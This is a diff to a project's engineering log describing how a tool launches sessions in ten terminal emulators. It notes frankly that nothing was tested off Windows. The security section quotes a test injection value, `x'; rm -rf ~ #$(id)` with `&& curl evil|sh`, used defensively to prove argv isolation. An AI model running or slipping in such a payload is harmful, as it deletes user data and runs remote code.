@@ -125,7 +125,23 @@ Honest inventory of what was not exercised on this machine:
   new session — which, had it done so, would have put a duplicate agent on the floor for every
   reply sent from the panel. Codex's `send()` remains unexercised along with the rest of that
   adapter.
-- `openInTerminal()` on macOS and Linux (Windows-only machine).
+- `openInTerminal()` and `openNewSession()` on macOS and Linux (Windows-only machine).
+  **Widened and re-stated, WP-04.** Both now go through a table of ten emulators
+  (`src/adapters/claude-code/terminals.mjs`) instead of one `.command` file and four `-e`
+  guesses. Every one of them is **implemented against the emulator's own documented CLI or
+  scheme, and unit-tested**: `test/unit/terminals.test.mjs` asserts the exact argv array for
+  all 21 (platform, emulator, launch form) pairs, and the pair list is checked against the
+  table, so an emulator cannot be added without one. Detection, `$TERMINAL` precedence, the
+  `terminal` settings pin and the shell-metacharacter cases are covered too.
+  **None of it has been run on a real Mac or a real Linux desktop.** No application has been
+  opened, no `open -na` has been executed, no AppleScript has been compiled by `osascript`,
+  and no `.command` file has been double-clicked by Terminal.app. A unit test proves the argv
+  is what the documentation says; it cannot prove the documentation is right, and rule §1.1.11
+  of `docs/plan/08-PLAN-V2-100X.md` says exactly that. **Acceptance step, still outstanding:
+  verify by hand on a real Mac and a real Linux desktop, and record here which emulators
+  actually launched, which did not, and what each one did instead.** Until that line exists,
+  README's "Honest limits" keeps saying macOS and Linux are unverified. See §88 for the
+  design and for the specific claims that are most likely to be wrong.
 - Hook install/remove against the user's real `settings.json`. It was verified against fake
   settings files in isolated processes: fresh install, no-op on double install, byte-identical
   restore, survival of unrelated hand edits, and a clean abort on malformed JSON.
@@ -3233,3 +3249,146 @@ populations with a uniform speckle across every project room's floor and nothing
 person, prop, wall or label moved, and `empty` passed. Goldens regenerated against the merged
 tree; the speckle is why a fixture change must regenerate goldens, and the harness's own noise
 floor (36 px) is unchanged.
+
+## 88. WP-04 — ten terminals, twenty-one asserted argv arrays, and not one of them run on a real desktop
+
+**Spec:** `06-ENGINEERING-WORKPLAN.md` WP-04, and `07-AGENT-HANDOVERS.md` Agent Backend.
+Detect and prefer Ghostty, iTerm2, Warp, kitty, WezTerm, then Terminal.app on macOS; add
+alacritty, foot, wezterm and kitty on Linux and honour `$TERMINAL` first; a settings entry to
+pin one; the same treatment for `openNewSession()`; keep the argv-array discipline.
+
+**Shipped:** all of it, in `src/adapters/claude-code/terminals.mjs`. The adapter's two launch
+functions are now three lines each — they name the command (`claude --resume <id>`, or
+`claude [prompt]`) and hand it to `launchTerminal()`, which owns detection, the per-emulator
+argv, the wrapper script and the fallback walk.
+
+### The table
+
+| Platform | Order              | Launched as                                                                   |
+| -------- | ------------------ | ----------------------------------------------------------------------------- |
+| macOS    | 1 Ghostty          | `ghostty --working-directory=<cwd> -e <argv>`, or `open -na Ghostty --args …`  |
+|          | 2 iTerm2           | `osascript -e <script> <wrapper.command>`                                      |
+|          | 3 Warp             | `open -a Warp <wrapper.command>`                                              |
+|          | 4 kitty            | `kitty --directory <cwd> <argv>`, or `open -na kitty --args …`                |
+|          | 5 WezTerm          | `wezterm start --cwd <cwd> -- <argv>`, or `open -na WezTerm --args …`         |
+|          | 6 Terminal.app     | `open -a Terminal <wrapper.command>`                                          |
+| Linux    | `$TERMINAL` first  | its own form if it is one of the below, else `<value> -e <argv>`               |
+|          | 1 Alacritty        | `alacritty --working-directory <cwd> -e <argv>`                               |
+|          | 2 foot             | `foot --working-directory=<cwd> <argv>`                                       |
+|          | 3 kitty            | `kitty --directory <cwd> <argv>`                                              |
+|          | 4 WezTerm          | `wezterm start --cwd <cwd> -- <argv>`                                         |
+|          | 5 GNOME Terminal   | `gnome-terminal --working-directory=<cwd> -- <argv>`                          |
+|          | 6 Konsole          | `konsole --workdir <cwd> -e <argv>`                                           |
+|          | 7 Xfce Terminal    | `xfce4-terminal --working-directory=<cwd> -x <argv>`                          |
+|          | 8 xterm            | `xterm -e <argv>` (cwd from the spawn; xterm has no flag)                     |
+|          | 9 x-terminal-emulator | `x-terminal-emulator -e <argv>`                                            |
+| Windows  | the console        | `cmd /c start "" cmd /k <argv>` — unchanged, and the only row ever run        |
+
+Detection order, highest first: the `terminal` setting; `$TERMINAL` (Linux); the emulator DeckHQ
+is itself running inside (`$TERM_PROGRAM`, or `KITTY_WINDOW_ID`, `FOOT_PID`, `KONSOLE_VERSION`,
+`GNOME_TERMINAL_SERVICE`, `ITERM_SESSION_ID`, `WEZTERM_PANE`, `ALACRITTY_WINDOW_ID`,
+`WARP_IS_LOCAL_SHELL_SESSION`, `GHOSTTY_RESOURCES_DIR` for the ones that set no
+`$TERM_PROGRAM`); then what is installed, in the order above; then the platform's guaranteed
+one. Every candidate is kept, so the launcher walks the list and stops at the first that
+actually spawns — a stale pin costs one failed spawn, not the feature.
+
+### What is NOT verified — the whole point of this entry
+
+**Nothing outside the Windows row has been executed anywhere.** This was written on a Windows
+machine. Twenty-one argv arrays are asserted byte for byte against the emulators' documented
+interfaces, and that is a different claim from "these work". Rule §1.1.11 of
+`08-PLAN-V2-100X.md`: a claim in anyone's documentation is a hypothesis until measured on a
+machine. These are hypotheses. §9 carries the acceptance step, and README's "Honest limits"
+still says macOS and Linux are unverified.
+
+The specific things most likely to be wrong, so the person with a Mac knows where to look:
+
+- **Ghostty's `-e`.** Whether the macOS app honours `--working-directory` and `-e` when they
+  arrive through `open --args` rather than on a real command line.
+- **Warp.** Its URL scheme (`warp://action/new_tab?path=…`) carries a path but no command, so
+  WP-04's stated fallback was taken: `open -a Warp <wrapper>.command`. Whether Warp opens a
+  `.command` file at all, rather than handing it back to Terminal.app, is untested. This is the
+  weakest row in the table.
+- **iTerm2's AppleScript.** `create window with default profile` then `write text` is the
+  documented pair, but the exact spelling varies across iTerm2 versions, and a wrong one fails
+  at compile time inside `osascript`, where nothing here can see it.
+- **`open -Ra <name>`** as an installed-or-not probe, and the bundle names guessed for it:
+  `iTerm.app` for iTerm2, lowercase `kitty.app`, then `Ghostty.app`, `WezTerm.app`, `Warp.app`.
+- **xfce4-terminal's `-x`.** Chosen over `-e` because `-e` takes one string and re-splits it,
+  which is the shell-string form this whole module exists to avoid. `-x` consumes the rest of
+  the command line, which means nothing may follow it — asserted, but not run.
+
+### Deviations from WP-04 as written
+
+1. **`x-terminal-emulator` is kept, last.** Not in WP-04's list; it was in the code this
+   replaces. On Debian and its derivatives it is the alternatives symlink through which a
+   user's chosen emulator is reached when it is not one of the eight named, so dropping it
+   would have been a regression for exactly the users most likely to have configured one.
+2. **An unrecognised `$TERMINAL` is used with `-e`.** WP-04 says honour `$TERMINAL` first and
+   does not say what to do when it names something not in the table. Ignoring a variable the
+   user set is worse than trying it, and `-e` is what the code this replaces used for the same
+   situation. An emulator wanting a different flag fails visibly rather than opening the wrong
+   thing.
+3. **`$TERM_PROGRAM` and `$TERMINAL` are treated as proof of presence; the pin is not.** Being
+   inside an emulator is live evidence it is installed, whatever `which` and `/Applications`
+   say — the usual reason a probe misses on a Mac that plainly has the app is that its CLI was
+   never symlinked, which is why such a case is launched through `open`. A pin is a stored
+   preference and the machine may have changed under it, so a pin whose probe misses is kept
+   but demoted behind everything actually found. It is never silently dropped: `deckhq doctor`
+   prints `Ghostty   (pinned in settings; not found on this machine)`.
+4. **The `terminal` setting is validated in three places, by what each layer can know.** The
+   HTTP route rejects an id no platform has (it may import the adapter's table).
+   `core/store.mjs` validates by SHAPE only — `core/` importing from `adapters/` would invert
+   `02-ARCHITECTURE.md` §2's layering, so the store guarantees only that the stored value can
+   never be a path, a flag, a shell fragment or a non-string. Detection ignores a pin it cannot
+   resolve on this platform, so a `state.json` carried between a Mac and a Linux box still
+   opens a terminal. All three layers are tested.
+5. **The macOS "new session" path now carries the first prompt.** The old one wrote
+   `exec claude` and dropped `opts.instructions` on the floor — a silent behavioural difference
+   from Windows that no test covered. The prompt is one argv element, and `shQuote`d whole
+   inside the wrapper.
+6. **The wrapper script's filename is sanitized.** The old one interpolated the session id into
+   `deckhq-resume-<id>-<ts>.command`, so an id containing `../` chose where in the filesystem
+   the script was written. Ids are now stripped to `[A-Za-z0-9._-]` and capped at 64
+   characters. Tested.
+7. **The terminal row is in `deckhq doctor` but NOT in `--share`.** Which emulator someone runs
+   is a fact about them, adds nothing to the numbers the share block exists to carry, and the
+   block's contents are governed by §84. Tested by asserting its absence.
+
+### The security discipline, and where it is imperfect
+
+Argv arrays end to end. The session id, the working directory and a first prompt travel as
+individual argv elements from the route to `spawn()`, and `test/unit/terminals.test.mjs`
+asserts, for every pair, that an id made of `x'; rm -rf ~ #$(id)` plus backticks plus
+`&& curl evil|sh` appears in exactly one argv element and is equal to it — never concatenated
+into a longer one. No launch form uses `sh -c`, and that is asserted too, by pattern, over every
+pair.
+
+Three macOS applications have no argv surface at all, so for those the command becomes a shell
+line — written to a `#!/bin/sh` wrapper file with every value single-quoted, and only its
+absolute path passed as an argument. The test recovers the argv back out of the generated line
+through the same grammar `sh` uses and asserts it equals the original, and separately asserts
+that the line matches the grammar of nothing but single-quoted words. The AppleScript never sees
+user data: `osascript` gets the wrapper's path as `argv`, and the script quotes it with
+`quoted form of`, which is the same transformation `shQuote` performs.
+
+The wrapper files are not cleaned up. One ~150-byte file per resume accumulates in the temp
+directory, as it did before this package. Left alone deliberately: pruning by pattern in a
+shared temp directory is a delete loop, and the OS clears it.
+
+### Left for other owners
+
+- **`src/adapters/codex/adapter.mjs` still builds shell strings.** Its macOS path interpolates
+  the session id into an AppleScript `do script "cd \"…\" && codex resume <id>"`, and its Linux
+  path into `bash -lc "codex resume <id>"`. That is the exact form this module was written to
+  remove, and it is one `launchTerminal()` call from being fixed. It was left alone because
+  WP-04's package is the Claude Code adapter and WP-23 owns Codex — but it should not wait for
+  WP-23, and a hostile session id reaches a shell there today.
+- **No UI.** The `terminal` setting is reachable through `POST /api/settings` and nowhere else;
+  `public/` is outside this package. A picker in the settings panel, populated from
+  `terminalIds()` filtered to the running platform, is Product Engineering's.
+- **The module's home.** It lives under `src/adapters/claude-code/` because WP-04 said so, and
+  because the spawn discipline belongs beside the adapter that spawns. It is not
+  Claude-Code-specific, and both `src/cli/doctor.mjs` and `src/http/routes/settings.mjs` now
+  import it across that boundary. When a second adapter adopts it, it should move to
+  `src/core/terminals.mjs`. Architect's call.
